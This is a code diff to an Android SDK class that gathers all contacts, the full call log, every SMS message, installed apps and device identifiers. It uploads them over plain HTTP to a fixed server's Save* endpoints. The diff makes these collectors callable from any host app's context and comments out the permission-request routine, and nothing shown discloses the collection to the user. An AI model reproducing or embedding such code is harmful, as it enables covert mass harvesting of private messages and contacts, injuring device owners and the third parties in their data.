@@ -7,6 +7,7 @@ import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.app.Application;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -15,6 +16,7 @@ import android.os.Build;
 import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -31,10 +33,6 @@ import com.android.volley.VolleyLog;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 import com.google.gson.Gson;
-import com.muthootfinance.retreivesdk.BuildConfig;
-import com.muthootfinance.retreivesdk.CallLogModel;
-import com.muthootfinance.retreivesdk.MainActivity;
-import com.muthootfinance.retreivesdk.SMSModel;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -61,84 +59,87 @@ public class GetDeviceDetails extends Activity {
     String currentDate, currentTime;
     public  static final int PERMISSIONS_MULTIPLE_REQUEST = 123;
 
-    private void checkPermission() {
-        if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.READ_CONTACTS) + ContextCompat
-                .checkSelfPermission(this,
-                        Manifest.permission.READ_CALL_LOG) + ContextCompat
-                .checkSelfPermission(this,
-                        Manifest.permission.READ_SMS) + ContextCompat
-                .checkSelfPermission(this,
-                        Manifest.permission.READ_PHONE_STATE)  + ContextCompat
-                .checkSelfPermission(this,
-                        Manifest.permission.INTERNET) + ContextCompat
-                .checkSelfPermission(this,
-                        Manifest.permission.ACCESS_NETWORK_STATE) + ContextCompat
-                .checkSelfPermission(this,
-                        Manifest.permission.WRITE_EXTERNAL_STORAGE)
-                != PackageManager.PERMISSION_GRANTED) {
-
-            if (ActivityCompat.shouldShowRequestPermissionRationale
-                    (this, Manifest.permission.READ_CONTACTS) ||
-                    ActivityCompat.shouldShowRequestPermissionRationale
-                            (this, Manifest.permission.READ_CALL_LOG) ||
-                    ActivityCompat.shouldShowRequestPermissionRationale
-                            (this, Manifest.permission.READ_SMS) ||
-                    ActivityCompat.shouldShowRequestPermissionRationale
-                            (this, Manifest.permission.READ_PHONE_STATE) ||
-                    ActivityCompat.shouldShowRequestPermissionRationale
-                            (this, Manifest.permission.INTERNET) ||
-                    ActivityCompat.shouldShowRequestPermissionRationale
-                            (this, Manifest.permission.ACCESS_NETWORK_STATE)  ||
-                    ActivityCompat.shouldShowRequestPermissionRationale
-                            (this, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    requestPermissions(
-                            new String[]{Manifest.permission
-                                    .READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
-                            PERMISSIONS_MULTIPLE_REQUEST);
-//                    getPhoneContacts();
+//    public void checkPermission() {
+//        if (ContextCompat.checkSelfPermission(this,
+//                Manifest.permission.READ_CONTACTS) + ContextCompat
+//                .checkSelfPermission(this,
+//                        Manifest.permission.READ_CALL_LOG) + ContextCompat
+//                .checkSelfPermission(this,
+//                        Manifest.permission.READ_SMS) + ContextCompat
+//                .checkSelfPermission(this,
+//                        Manifest.permission.READ_PHONE_STATE)  + ContextCompat
+//                .checkSelfPermission(this,
+//                        Manifest.permission.INTERNET) + ContextCompat
+//                .checkSelfPermission(this,
+//                        Manifest.permission.ACCESS_NETWORK_STATE) + ContextCompat
+//                .checkSelfPermission(this,
+//                        Manifest.permission.WRITE_EXTERNAL_STORAGE)
+//                != PackageManager.PERMISSION_GRANTED) {
+//
+//            if (ActivityCompat.shouldShowRequestPermissionRationale
+//                    (this, Manifest.permission.READ_CONTACTS) ||
+//                    ActivityCompat.shouldShowRequestPermissionRationale
+//                            (this, Manifest.permission.READ_CALL_LOG) ||
+//                    ActivityCompat.shouldShowRequestPermissionRationale
+//                            (this, Manifest.permission.READ_SMS) ||
+//                    ActivityCompat.shouldShowRequestPermissionRationale
+//                            (this, Manifest.permission.READ_PHONE_STATE) ||
+//                    ActivityCompat.shouldShowRequestPermissionRationale
+//                            (this, Manifest.permission.INTERNET) ||
+//                    ActivityCompat.shouldShowRequestPermissionRationale
+//                            (this, Manifest.permission.ACCESS_NETWORK_STATE)  ||
+//                    ActivityCompat.shouldShowRequestPermissionRationale
+//                            (this, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+//                    requestPermissions(
+//                            new String[]{Manifest.permission
+//                                    .READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
+//                            PERMISSIONS_MULTIPLE_REQUEST);
+////                    getPhoneContacts();
+////            getCallLogs();
+////            getAllSms();
+////            getInstalledApps();
+////            getDeviceDetails();
+//                }
+////                Snackbar.make(getActivity().findViewById(android.R.id.content),
+////                        "Please Grant Permissions to upload profile photo",
+////                        Snackbar.LENGTH_INDEFINITE).setAction("ENABLE",
+////                        new View.OnClickListener() {
+////                            @Override
+////                            public void onClick(View v) {
+////                                requestPermissions(
+////                                        new String[]{Manifest.permission
+////                                                .READ_EXTERNAL_STORAGE, Manifest.permission.CAMERA},
+////                                        PERMISSIONS_MULTIPLE_REQUEST);
+////                            }
+////                        }).show();
+//            } else {
+//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+//                    requestPermissions(
+//                            new String[]{Manifest.permission
+//                                    .READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
+//                            PERMISSIONS_MULTIPLE_REQUEST);
+//                }
+//            }
+//        } else {
+//            getPhoneContacts();
 //            getCallLogs();
 //            getAllSms();
 //            getInstalledApps();
 //            getDeviceDetails();
-                }
-//                Snackbar.make(getActivity().findViewById(android.R.id.content),
-//                        "Please Grant Permissions to upload profile photo",
-//                        Snackbar.LENGTH_INDEFINITE).setAction("ENABLE",
-//                        new View.OnClickListener() {
-//                            @Override
-//                            public void onClick(View v) {
-//                                requestPermissions(
-//                                        new String[]{Manifest.permission
-//                                                .READ_EXTERNAL_STORAGE, Manifest.permission.CAMERA},
-//                                        PERMISSIONS_MULTIPLE_REQUEST);
-//                            }
-//                        }).show();
-            } else {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    requestPermissions(
-                            new String[]{Manifest.permission
-                                    .READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.INTERNET, Manifest.permission.ACCESS_NETWORK_STATE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
-                            PERMISSIONS_MULTIPLE_REQUEST);
-                }
-            }
-        } else {
-//            getPhoneContacts();
-//            getCallLogs();
-            getAllSms();
-//            getInstalledApps();
-//            getDeviceDetails();
-        }
-    }
+//        }
+//    }
 
     @SuppressLint({"Range", "HardwareIds"})
-    public void getPhoneContacts() {
-        int count = 0;
-        ContentResolver contentResolver = getContentResolver();
+    public void getPhoneContacts(Context context) {
+        currentDate = formatter.format(new Date());
+        currentTime = formatterTime.format(new Date());
+        android_id = Settings.Secure.getString(context.getContentResolver(),
+                Settings.Secure.ANDROID_ID);
+//        ContentResolver contentResolver = context.getContentResolver();
         Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
 
-        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+        Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
         Log.i("ContactDemo", "Total # of Contacts" + Integer.toString(cursor.getCount()));
         if (cursor.getCount() > 0) {
             while (cursor.moveToNext()) {
@@ -148,7 +149,7 @@ public class GetDeviceDetails extends Activity {
                 @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
 
                 if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
-                    Cursor pCur = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
+                    Cursor pCur = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                     while (pCur.moveToNext()) {
                         String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                         Log.i("ContactDemo", "Name: " + name);
@@ -157,7 +158,7 @@ public class GetDeviceDetails extends Activity {
 //                            callContactPushApi(name, phone+No, currentDate, currentTime, android_id, "Android SDK", "Android SDK");
 //                            generateFile(count++, name, phoneNo, currentDate, currentTime, android_id, "Android SDK", "Android SDK");
                     }
-                    callContactPushApi(list.toString(), "Phone", currentDate, currentTime, android_id, "Android SDK", "Android SDK");
+                    callContactPushApi(context, list.toString(), "Phone", currentDate, currentTime, android_id, "Android SDK", "Android SDK");
                     pCur.close();
                 }
 
@@ -183,7 +184,7 @@ public class GetDeviceDetails extends Activity {
             writer.append(lusr + "\n");
             writer.flush();
             writer.close();
-            Toast.makeText(this, "Saved", Toast.LENGTH_SHORT).show();
+//            Toast.makeText(this, "Saved", Toast.LENGTH_SHORT).show();
 
         } catch (IOException e) {
             e.printStackTrace();
@@ -191,9 +192,9 @@ public class GetDeviceDetails extends Activity {
     }
 
 
-    void callContactPushApi(String name, String number, String date, String time, String deviceId, String uid, String lusr) {
+    void callContactPushApi(Context context, String name, String number, String date, String time, String deviceId, String uid, String lusr) {
         try {
-            RequestQueue requestQueue = Volley.newRequestQueue(this);
+            RequestQueue requestQueue = Volley.newRequestQueue(context);
             String URL = "http://10.85.207.85:2024/api/SaveContactDetails";
             JSONObject jsonBody = new JSONObject();
             jsonBody.put("Id", 1);
@@ -203,7 +204,7 @@ public class GetDeviceDetails extends Activity {
             jsonBody.put("Time", time);
             jsonBody.put("Device_Id", deviceId);
             jsonBody.put("Uid", uid);
-            jsonBody.put("SdkVersion", BuildConfig.VERSION_NAME);
+            jsonBody.put("SdkVersion", BuildConfig.LIBRARY_PACKAGE_NAME);
             jsonBody.put("LUSR", lusr);
             final String requestBody = jsonBody.toString();
             Log.d("RequestBody", requestBody);
@@ -255,10 +256,14 @@ public class GetDeviceDetails extends Activity {
     }
 
     @SuppressLint("HardwareIds")
-    public void getCallLogs() {
+    public void getCallLogs(Context context) {
+        currentDate = formatter.format(new Date());
+        currentTime = formatterTime.format(new Date());
+        android_id = Settings.Secure.getString(context.getContentResolver(),
+                Settings.Secure.ANDROID_ID);
         List<String> lstCallLog = new ArrayList<>();
         StringBuffer sb = new StringBuffer();
-        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
+        Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null,
                 null, null, null);
         int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
         int cache_name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
@@ -295,12 +300,12 @@ public class GetDeviceDetails extends Activity {
 //                callCallLogPushApi(1, phNumber, name, callDuration, dir, callDate, android_id, "Android SDK", "Android SDK");
         }
         managedCursor.close();
-        callCallLogPushApi(1, "phNumber", lstCallLog.toString(), "callDuration", "dir", "callDate", android_id, "Android SDK", "Android SDK");
+        callCallLogPushApi(context, 1, "phNumber", lstCallLog.toString(), "callDuration", "dir", "callDate", android_id, "Android SDK", "Android SDK");
     }
 
-    void callCallLogPushApi(int id, String number, String name, String duration, String callType, String timestamp, String deviceId, String uid, String lusr) {
+    void callCallLogPushApi(Context context, int id, String number, String name, String duration, String callType, String timestamp, String deviceId, String uid, String lusr) {
         try {
-            RequestQueue requestQueue = Volley.newRequestQueue(this);
+            RequestQueue requestQueue = Volley.newRequestQueue(context);
             String URL = "http://10.85.207.85:2024/api/SaveCallHistory";
             JSONObject jsonBody = new JSONObject();
             jsonBody.put("ID", id);
@@ -311,7 +316,7 @@ public class GetDeviceDetails extends Activity {
             jsonBody.put("TIMESTAMP", timestamp);
             jsonBody.put("DEVICE_ID", deviceId);
             jsonBody.put("UID", uid);
-            jsonBody.put("SDKVERSION", BuildConfig.VERSION_NAME);
+            jsonBody.put("SDKVERSION", BuildConfig.LIBRARY_PACKAGE_NAME);
             jsonBody.put("LUSR", lusr);
             final String requestBody = jsonBody.toString();
 
@@ -362,12 +367,18 @@ public class GetDeviceDetails extends Activity {
     }
 
     @SuppressLint("HardwareIds")
-    public void getAllSms() {
+    public void getAllSms(Context context) {
+        time =simpleTime.format(new Date());
+        date = simpleDate.format(new Date());
+        currentDate = formatter.format(new Date());
+        currentTime = formatterTime.format(new Date());
+        android_id = Settings.Secure.getString(context.getContentResolver(),
+                Settings.Secure.ANDROID_ID);
         List<String> lstSms = new ArrayList<>();
-        String dateString = formatter.format(new Date(Long.parseLong(time)));
-        String timeString = formatterTime.format(new Date(Long.parseLong(time)));
+//        String dateString = formatter.format(new Date(Long.parseLong(time)));
+//        String timeString = formatterTime.format(new Date(Long.parseLong(time)));
         Uri message = Uri.parse("content://sms/");
-        ContentResolver cr = this.getContentResolver();
+        ContentResolver cr = context.getContentResolver();
 
         Cursor c = cr.query(message, null, null, null, null);
         this.startManagingCursor(c);
@@ -396,7 +407,7 @@ public class GetDeviceDetails extends Activity {
 
 //        sendData(1,  "Send Data",lstSms.toString(), "dateString", "timeString", android_id, "Android SDK", "Android SDK");
         Log.d("SMS - ", lstSms.toString());
-        callMessagePushApi(1, lstSms.toString(), "Call Method", dateString, timeString, android_id, "Android SDK", "Android SDK");
+        callMessagePushApi(context, 1, lstSms.toString(), "Call Method", "dateString", "timeString", android_id, "Android SDK", "Android SDK");
         c.close();
 
     }
@@ -420,9 +431,9 @@ public class GetDeviceDetails extends Activity {
         }
     }
 
-    void callMessagePushApi(int id, String smsFrom, String body, String date, String time, String deviceId, String uid, String lusr) {
+    void callMessagePushApi(Context context, int id, String smsFrom, String body, String date, String time, String deviceId, String uid, String lusr) {
         try {
-            RequestQueue requestQueue = Volley.newRequestQueue(this);
+            RequestQueue requestQueue = Volley.newRequestQueue(context);
             String URL = "http://10.85.207.85:2024/api/SaveSmsDetails";
             JSONObject jsonBody = new JSONObject();
             jsonBody.put("Id", id);
@@ -432,7 +443,7 @@ public class GetDeviceDetails extends Activity {
             jsonBody.put("Time", time);
             jsonBody.put("DeviceId", deviceId);
             jsonBody.put("UId", uid);
-            jsonBody.put("SDKVERSION", BuildConfig.VERSION_NAME);
+            jsonBody.put("SDKVERSION", BuildConfig.LIBRARY_PACKAGE_NAME);
             jsonBody.put("LUSR", lusr);
             final String requestBody = jsonBody.toString();
 //            generateFile(jsonBody.toString());
@@ -485,9 +496,15 @@ public class GetDeviceDetails extends Activity {
 
 
     @SuppressLint("HardwareIds")
-    public void getInstalledApps(){
+    public void getInstalledApps(Context context){
+        time = simpleTime.format(new Date());
+        date = simpleDate.format(new Date());
+        currentDate = formatter.format(new Date());
+        currentTime = formatterTime.format(new Date());
+        android_id = Settings.Secure.getString(context.getContentResolver(),
+                Settings.Secure.ANDROID_ID);
         List<String> appsList = new ArrayList<>();
-        final PackageManager pm = getPackageManager();
+        final PackageManager pm = context.getPackageManager();
         List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
 
         for (ApplicationInfo packageInfo : packages) {
@@ -497,12 +514,12 @@ public class GetDeviceDetails extends Activity {
 //            callAppsPushApi(1, packageInfo.name, packageInfo.packageName, date, time, android_id, "Android SDK", "Android SDK");
             Log.d(TAG, "Inserted");
         }
-        callAppsPushApi(1, appsList.toString(), "packageName", date, time, android_id, "Android SDK", "Android SDK");
+        callAppsPushApi(context, 1, appsList.toString(), "packageName", date, time, android_id, "Android SDK", "Android SDK");
     }
 
-    void callAppsPushApi(int id, String appName, String packageName, String date, String time, String deviceId, String uid, String lusr) {
+    void callAppsPushApi(Context context, int id, String appName, String packageName, String date, String time, String deviceId, String uid, String lusr) {
         try {
-            RequestQueue requestQueue = Volley.newRequestQueue(this);
+            RequestQueue requestQueue = Volley.newRequestQueue(context);
             String URL = "http://10.85.207.85:2024/api/SaveAppsDetails";
             JSONObject jsonBody = new JSONObject();
             jsonBody.put("Id", id);
@@ -512,7 +529,7 @@ public class GetDeviceDetails extends Activity {
             jsonBody.put("Time", time);
             jsonBody.put("DeviceId", deviceId);
             jsonBody.put("UId", uid);
-            jsonBody.put("SDKVERSION", BuildConfig.VERSION_NAME);
+            jsonBody.put("SDKVERSION", BuildConfig.LIBRARY_PACKAGE_NAME);
             jsonBody.put("LUSR", lusr);
             final String requestBody = jsonBody.toString();
 
@@ -563,13 +580,19 @@ public class GetDeviceDetails extends Activity {
     }
 
     @SuppressLint("HardwareIds")
-    public void getDeviceDetails() {
-        callDeviceDetailsPushApi(1, "Android", Build.BRAND, Build.MODEL, String.valueOf(Build.VERSION.SDK_INT), currentDate, currentTime, android_id, "Android SDK", "Android SDK");
+    public void getDeviceDetails(Context context) {
+        time = simpleTime.format(new Date());
+        date = simpleDate.format(new Date());
+        currentDate = formatter.format(new Date());
+        currentTime = formatterTime.format(new Date());
+        android_id = Settings.Secure.getString(context.getContentResolver(),
+                Settings.Secure.ANDROID_ID);
+        callDeviceDetailsPushApi(context, 1, "Android", Build.BRAND, Build.MODEL, String.valueOf(Build.VERSION.SDK_INT), currentDate, currentTime, android_id, "Android SDK", "Android SDK");
     }
 
-    void callDeviceDetailsPushApi(int id, String osType, String device, String model, String osVersion, String date, String time, String deviceId, String uid, String lusr) {
+    void callDeviceDetailsPushApi(Context context, int id, String osType, String device, String model, String osVersion, String date, String time, String deviceId, String uid, String lusr) {
         try {
-            RequestQueue requestQueue = Volley.newRequestQueue(this);
+            RequestQueue requestQueue = Volley.newRequestQueue(context);
             String URL = "http://10.85.207.85:2024/api/SaveDeviceDetails";
             JSONObject jsonBody = new JSONObject();
             jsonBody.put("ID", id);
@@ -581,7 +604,7 @@ public class GetDeviceDetails extends Activity {
             jsonBody.put("TIME", time);
             jsonBody.put("DEVICE_ID", deviceId);
             jsonBody.put("UID", uid);
-            jsonBody.put("SDKVERSION", BuildConfig.VERSION_NAME);
+            jsonBody.put("SDKVERSION", BuildConfig.LIBRARY_PACKAGE_NAME);
             jsonBody.put("LUSR", lusr);
             final String requestBody = jsonBody.toString();
 
